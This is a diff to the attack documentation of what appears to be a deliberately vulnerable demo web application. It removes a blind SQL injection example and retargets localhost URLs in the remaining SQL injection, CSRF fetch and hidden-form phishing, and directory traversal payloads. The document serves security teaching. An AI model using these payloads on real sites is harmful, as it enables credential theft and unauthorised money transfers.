@@ -52,25 +52,6 @@ SELECT id, name, info FROM products WHERE name='' UNION SELECT 1, CONCAT(email, 
 This would display all users’ credentials in the search results (if column counts and types match).
 
 ---
-
-### c) **Blind SQL Injection**
-
-**Payload**:
-
-- **Email**: `admin@example.com' AND (SELECT SUBSTRING(pass,1,1) FROM users WHERE id=1)='a`
-    
-
-**Injected Query**:
-
-```sql
-SELECT * FROM users 
-WHERE email='admin@example.com' AND (SELECT SUBSTRING(pass,1,1) FROM users WHERE id=1)='a'
-```
-
-This doesn't reveal errors or results directly, but with repeated guessing, the attacker can infer the password one character at a time.
-
----
-
 ## 2. CSRF Attack Vectors
 
 ### JavaScript `fetch()` Method (IMG Tag Alternative)
@@ -79,7 +60,7 @@ This uses `fetch()` to simulate a form submission directly in JavaScript:
 
 ```html
 <script>
-fetch("http://localhost/login_app/dashboard.php", {
+fetch("http://localhost/Web-Security-Demo-Application/dashboard.php", {
   method: "POST",
   headers: {
     "Content-Type": "application/x-www-form-urlencoded",
@@ -98,7 +79,7 @@ Fake Prize Page with Hidden CSRF Attack
 This is an example of a phishing page designed to trick users into clicking a button under the pretense of winning a prize. In reality, clicking the button submits a hidden form that performs a CSRF attack — transferring money without the user’s knowledge.
 Malicious HTML Overview:
 
-<form id="csrf-form" action="http://localhost/login_app/dashboard.php" method="POST" target="csrf-frame">
+<form id="csrf-form" action="http://localhost/Web-Security-Demo-Application/dashboard.php" method="POST" target="csrf-frame">
     <input type="hidden" name="to_id" value="2">
     <input type="hidden" name="amount" value="500">
     <input type="hidden" name="transfer" value="Transfer Money">
@@ -134,7 +115,7 @@ This is a classic CSRF combined with social engineering, where the attacker uses
 Use directory traversal sequences to access files outside the intended path:
 
 ```
-http://localhost/login_app/../passwords.txt
+http://localhost/Web-Security-Demo-Application/../passwords.txt
 ```
 Let's say that we have a passwords.txt file outside of our website. Using the "../" syntax we escape the site's scope and retreive any files outside of the folder. So ../passwords.txt will get us the passwords.txt file outside of the folder.
 
